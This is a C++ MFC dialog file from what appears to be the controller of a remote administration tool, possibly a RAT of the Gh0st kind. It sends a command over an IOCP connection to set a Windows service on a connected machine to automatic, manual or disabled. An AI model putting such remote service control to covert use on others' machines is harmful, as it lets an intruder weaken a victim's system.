// SerAttribDlg.cpp : implementation file
//

#include "stdafx.h"
#include "DHL_yk.h"
#include "SerAttribDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CSerAttribDlg dialog


CSerAttribDlg::CSerAttribDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CSerAttribDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CSerAttribDlg)
	m_name = _T("");
	m_showname = _T("");
	m_miaoshu = _T("");
	m_path = _T("");
	//}}AFX_DATA_INIT
}


void CSerAttribDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CSerAttribDlg)
	DDX_Control(pDX, IDC_COMBO1, m_start_com);
//	DDX_Text(pDX, IDC_SERVICE_NAME, m_name);
	DDX_Text(pDX, IDC_SHOWNAME, m_showname);
	DDX_Text(pDX, IDC_MIAOSHU, m_miaoshu);
	DDX_Text(pDX, IDC_PATH, m_path);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CSerAttribDlg, CDialog)
	//{{AFX_MSG_MAP(CSerAttribDlg)
	ON_CBN_SELCHANGE(IDC_COMBO1, OnSelchangeCombo1)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CSerAttribDlg message handlers

void CSerAttribDlg::OnOK() 
{
	// TODO: Add extra validation here
	if(count!=m_start_com.GetCurSel()){                 //选择改变  1自动,2禁止,3引导,4手动,5系统,6未知
		*indexed=index;
		*counted=4;
		BYTE b=0;
		CString comstr;
		GetDlgItemText(IDC_COMBO1, comstr);
		if(comstr=="禁止"){
			info->Format("%s","禁止");
			b=2;			  
		}else if(comstr=="手动"){
			b=4;			  
			info->Format("%s","手动");
		}else{
			b=1;
			info->Format("%s","自动");
		}
		count=m_start_com.GetCurSel();
		GetDlgItem(IDOK)->EnableWindow(false);  
		BYTE *bToken=new BYTE[3+m_name.GetLength()];
		ZeroMemory(bToken,3+m_name.GetLength());
		bToken[0]= COMMAND_SERVERS_SETOPT;
		bToken[1]=b;
		memcpy(bToken+2,m_name.GetBuffer(0),m_name.GetLength());
		m_iocpServer->Send(m_pContext, bToken, 3+m_name.GetLength());
		delete[] bToken;
	}
	

	CDialog::OnOK();
}

BOOL CSerAttribDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here
	GetDlgItem(IDOK)->EnableWindow(false);
	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

void CSerAttribDlg::init(int *indexed, int *counted, CString *info, CIOCPServer *m_iocpServer, ClientContext *m_pContext)
{
	this->indexed=indexed;
	this->counted=counted;
	this->info=info;
	this->m_iocpServer=m_iocpServer;
	this->m_pContext=m_pContext;
	
	
	CString struser;                                       //用户组框处理
	m_start_com.AddString("自动");
	m_start_com.SetItemData(0,0);
	m_start_com.AddString("手动");
	m_start_com.SetItemData(0,0);
	m_start_com.AddString("禁止");
	m_start_com.SetItemData(0,0);
	m_start_com.SetCurSel(count);
	
	UpdateData(false);
}

void CSerAttribDlg::OnSelchangeCombo1() 
{
	// TODO: Add your control notification handler code here
	if(count!=m_start_com.GetCurSel()){                 //选择改变
	       
		GetDlgItem(IDOK)->EnableWindow(true);
		//count=m_start_com.GetCurSel();
	}
}
